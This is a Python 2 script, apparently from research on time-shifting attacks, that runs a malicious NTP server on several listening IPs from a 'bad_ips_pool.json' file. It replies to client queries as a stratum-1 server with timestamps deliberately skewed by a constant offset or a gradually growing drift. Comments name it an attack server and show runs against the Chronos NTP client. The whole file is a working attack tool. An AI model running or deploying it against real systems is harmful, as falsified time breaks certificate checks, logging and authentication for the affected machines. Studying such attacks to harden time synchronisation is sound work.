import datetime
import socket
import struct
import time
import Queue
import threading
import select
import sys
import logging

taskQueue = Queue.Queue()
stopFlag = False

shift_type = sys.argv[1]
c_shift = sys.argv[2]
slop_t_0 = sys.argv[3]
slop = sys.argv[4]

handler = logging.StreamHandler()
handler.setLevel(logging.INFO)
handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s', datefmt='%H:%M:%S'))

logger = logging.getLogger(__name__)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

def system_to_ntp_time(timestamp):
    """Convert a system time to a NTP time.
    Parameters:
    timestamp -- timestamp in system time
    Returns:
    corresponding NTP time
    """
    return timestamp + NTP.NTP_DELTA


def _to_int(timestamp):
    """Return the integral part of a timestamp.
    Parameters:
    timestamp -- NTP timestamp
    Retuns:
    integral part
    """
    return int(timestamp)


def _to_frac(timestamp, n=32):
    """Return the fractional part of a timestamp.
    Parameters:
    timestamp -- NTP timestamp
    n         -- number of bits of the fractional part
    Retuns:
    fractional part
    """
    return int(abs(timestamp - _to_int(timestamp)) * 2 ** n)


def _to_time(integ, frac, n=32):
    """Return a timestamp from an integral and fractional part.
    Parameters:
    integ -- integral part
    frac  -- fractional part
    n     -- number of bits of the fractional part
    Retuns:
    timestamp
    """
    return integ + float(frac) / 2 ** n


class NTPException(Exception):
    """Exception raised by this module."""
    pass


class NTP:
    """Helper class defining constants."""

    _SYSTEM_EPOCH = datetime.date(*time.gmtime(0)[0:3])
    """system epoch"""
    _NTP_EPOCH = datetime.date(1900, 1, 1)
    """NTP epoch"""
    NTP_DELTA = (_SYSTEM_EPOCH - _NTP_EPOCH).days * 24 * 3600
    """delta between system and NTP time"""

    REF_ID_TABLE = {
        'DNC': "DNC routing protocol",
        'NIST': "NIST public modem",
        'TSP': "TSP time protocol",
        'DTS': "Digital Time Service",
        'ATOM': "Atomic clock (calibrated)",
        'VLF': "VLF radio (OMEGA, etc)",
        'callsign': "Generic radio",
        'LORC': "LORAN-C radionavidation",
        'GOES': "GOES UHF environment satellite",
        'GPS': "GPS UHF satellite positioning",
    }
    """reference identifier table"""

    STRATUM_TABLE = {
        0: "unspecified",
        1: "primary reference",
    }
    """stratum table"""

    MODE_TABLE = {
        0: "unspecified",
        1: "symmetric active",
        2: "symmetric passive",
        3: "client",
        4: "server",
        5: "broadcast",
        6: "reserved for NTP control messages",
        7: "reserved for private use",
    }
    """mode table"""

    LEAP_TABLE = {
        0: "no warning",
        1: "last minute has 61 seconds",
        2: "last minute has 59 seconds",
        3: "alarm condition (clock not synchronized)",
    }
    """leap indicator table"""


class NTPPacket:
    """NTP packet class.
    This represents an NTP packet.
    """

    _PACKET_FORMAT = "!B B B b 11I"
    """packet format to pack/unpack"""

    def __init__(self, version=2, mode=3, tx_timestamp=0):
        """Constructor.
        Parameters:
        version      -- NTP version
        mode         -- packet mode (client, server)
        tx_timestamp -- packet transmit timestamp
        """
        self.leap = 0
        """leap second indicator"""
        self.version = version
        """version"""
        self.mode = mode
        """mode"""
        self.stratum = 0
        """stratum"""
        self.poll = 0
        """poll interval"""
        self.precision = 0
        """precision"""
        self.root_delay = 0
        """root delay"""
        self.root_dispersion = 0
        """root dispersion"""
        self.ref_id = 0
        """reference clock identifier"""
        self.ref_timestamp = 0
        """reference timestamp"""
        self.orig_timestamp = 0
        self.orig_timestamp_high = 0
        self.orig_timestamp_low = 0
        """originate timestamp"""
        self.recv_timestamp = 0
        """receive timestamp"""
        self.tx_timestamp = tx_timestamp
        self.tx_timestamp_high = 0
        self.tx_timestamp_low = 0
        """tansmit timestamp"""

    def to_data(self):
        """Convert this NTPPacket to a buffer that can be sent over a socket.
        Returns:
        buffer representing this packet
        Raises:
        NTPException -- in case of invalid field
        """
        try:
            packed = struct.pack(NTPPacket._PACKET_FORMAT,
                                 (self.leap << 6 | self.version << 3 | self.mode),
                                 self.stratum,
                                 self.poll,
                                 self.precision,
                                 _to_int(self.root_delay) << 16 | _to_frac(self.root_delay, 16),
                                 _to_int(self.root_dispersion) << 16 |
                                 _to_frac(self.root_dispersion, 16),
                                 self.ref_id,
                                 _to_int(self.ref_timestamp),
                                 _to_frac(self.ref_timestamp),
                                 # Change by lichen, avoid loss of precision
                                 self.orig_timestamp_high,
                                 self.orig_timestamp_low,
                                 _to_int(self.recv_timestamp),
                                 _to_frac(self.recv_timestamp),
                                 _to_int(self.tx_timestamp),
                                 _to_frac(self.tx_timestamp))
        except struct.error:
            raise NTPException("Invalid NTP packet fields.")
        return packed

    def from_data(self, data):
        """Populate this instance from a NTP packet payload received from
        the network.
        Parameters:
        data -- buffer payload
        Raises:
        NTPException -- in case of invalid packet format
        """
        try:
            unpacked = struct.unpack(NTPPacket._PACKET_FORMAT,
                                     data[0:struct.calcsize(NTPPacket._PACKET_FORMAT)])
        except struct.error:
            raise NTPException("Invalid NTP packet.")

        self.leap = unpacked[0] >> 6 & 0x3
        self.version = unpacked[0] >> 3 & 0x7
        self.mode = unpacked[0] & 0x7
        self.stratum = unpacked[1]
        self.poll = unpacked[2]
        self.precision = unpacked[3]
        self.root_delay = float(unpacked[4]) / 2 ** 16
        self.root_dispersion = float(unpacked[5]) / 2 ** 16
        self.ref_id = unpacked[6]
        self.ref_timestamp = _to_time(unpacked[7], unpacked[8])
        self.orig_timestamp = _to_time(unpacked[9], unpacked[10])
        self.orig_timestamp_high = unpacked[9]
        self.orig_timestamp_low = unpacked[10]
        self.recv_timestamp = _to_time(unpacked[11], unpacked[12])
        self.tx_timestamp = _to_time(unpacked[13], unpacked[14])
        self.tx_timestamp_high = unpacked[13]
        self.tx_timestamp_low = unpacked[14]

    def GetTxTimeStamp(self):
        return self.tx_timestamp_high, self.tx_timestamp_low

    def SetOriginTimeStamp(self, high, low):
        self.orig_timestamp_high = high
        self.orig_timestamp_low = low


class RecvThread(threading.Thread):
    def __init__(self, sockets):
        threading.Thread.__init__(self)
        self.sockets = sockets

    def run(self):
        global taskQueue, stopFlag
        while True:
            if stopFlag:
                logger.info("RecvThread Ended")
                break
            # readable, writable, exceptional = select.select(inputs, outputs, inputs)
            rlist, wlist, elist = select.select(self.sockets, [], [], 1)
            if len(rlist) != 0:
                logger.info("Received {n} packets".format(n=len(rlist)))
                for tempSocket in rlist:
                    try:
                        sid = sockets.index(tempSocket)
                        data, addr = tempSocket.recvfrom(1024)
                        # getting the current ntp time and putting it in a queue (for each socket)
                        recvTimestamp = system_to_ntp_time(time.time())
                        taskQueue.put((data, addr, sid, recvTimestamp))
                    except socket.error as msg:
                        logger.info(msg)


class WorkThread(threading.Thread):
    def __init__(self, sockets, shift_type='CONSTANT', c_shift=0, slop=0, slop_t_0=0, packet_params=None):
        threading.Thread.__init__(self)
        self.sockets = sockets
        self.shift_type = shift_type
        self.c_shift = c_shift
        self.slop = slop
        self.slop_t_0 = slop_t_0
        if packet_params:
            self.packet_params=packet_params
        else:
            self.packet_params = {}

    def get_time_shift(self, t):
        if self.shift_type == 'CONSTANT':
            return self.c_shift
        time_shift = (self.slop * (t - self.slop_t_0)) if t > self.slop_t_0 else 0
        print time_shift
        return time_shift

    def create_send_packet(self, version=3, mode=4, stratum=1, poll=10):
        sendPacket = NTPPacket(version=version, mode=mode)
        sendPacket.stratum = stratum
        sendPacket.poll = poll
        '''
        sendPacket.precision = 0xfa
        sendPacket.root_delay = 0x0bfa
        sendPacket.root_dispersion = 0x0aa7
        sendPacket.ref_id = 0x808a8c2c
        '''
        return sendPacket

    def run(self):
        global taskQueue, stopFlag
        while True:
            if stopFlag:
                logger.info("WorkThread Ended")
                break
            try:
                data, addr, sid, recvTimestamp = taskQueue.get(timeout=1)
                recvPacket = NTPPacket()
                recvPacket.from_data(data)
                time_shift = self.get_time_shift(t=recvTimestamp- NTP.NTP_DELTA)
                # recvTimestamp = the time when we opened the socket, NTP.NTP_DELTA = the current computer time
                timeStamp_high, timeStamp_low = recvPacket.GetTxTimeStamp()
                sendPacket = self.create_send_packet(**self.packet_params)

                sendPacket.ref_timestamp = recvTimestamp - 5
                # verify -5
                sendPacket.SetOriginTimeStamp(timeStamp_high, timeStamp_low)
                sendPacket.recv_timestamp = recvTimestamp + time_shift
                now = time.time()
                sendPacket.tx_timestamp = system_to_ntp_time(now + time_shift)
                socket = self.sockets[sid]
                socket.sendto(sendPacket.to_data(), addr)
                logger.info("recv: {recvTimestamp:f} -> {s_recvTimestamp:f}".format(recvTimestamp=recvTimestamp, s_recvTimestamp=sendPacket.recv_timestamp))
                logger.info("tx: {real:f} -> {new:f}".format(real=system_to_ntp_time(now), new=sendPacket.tx_timestamp))
                logger.info("Sended to {a0}:{a1}".format(a0=addr[0], a1=addr[1]))
            except Queue.Empty:
                continue

import json

# python ntp_multi_attack_server.py CONSTANT 1 1 1 bad_ips_pool.json
# python ntp_multi_attack_server.py BLA 1 180 0.01 bad_ips_pool.json
# CHRONOS:
# sudo python /media/sf_temp/chronos_d.py -m 5 -d 0.2 -p /media/sf_temp/chronos_servers_pool1.json -S /media/sf_temp/current_s_0.json -w 0.025 -e 0.05 -o /media/sf_temp/ -n 30

if __name__ == "__main__":
    # USAGE ntp_adversary.py [shift_type] [c_shift] [slop_t] [slop] [interfaces_file]
    line_args = [datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")] + sys.argv
    file(sys.argv[0]+".log", "a+").write(" ".join(line_args))
    shift_type = sys.argv[1]
    c_shift = float(sys.argv[2])
    slop_t = float(sys.argv[3])
    slop = float(sys.argv[4])
    interfaces_file = sys.argv[5]

    listenPort = 123

    listenIps = json.load(file(interfaces_file))
    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for ip in listenIps]
    [sockets[i].bind((listenIps[i], listenPort)) for i in range(len(listenIps))]

    #logger.info("local socket: {sockname}".format(sockname=socket.getsockname()))
    recvThread = RecvThread(sockets)
    recvThread.start()
    workThread = WorkThread(sockets, shift_type=shift_type, slop_t_0=time.time()+slop_t, slop=slop, c_shift=c_shift)
    workThread.start()

    while True:
        try:
            time.sleep(0.5)
        except KeyboardInterrupt:

            logger.info("Exiting...")
            stopFlag = True
            recvThread.join()
            workThread.join()
            # socket.close()

            logger.info("Exited")
            break

    pass
    # accept ntp request
    # return ntp response with timeshift

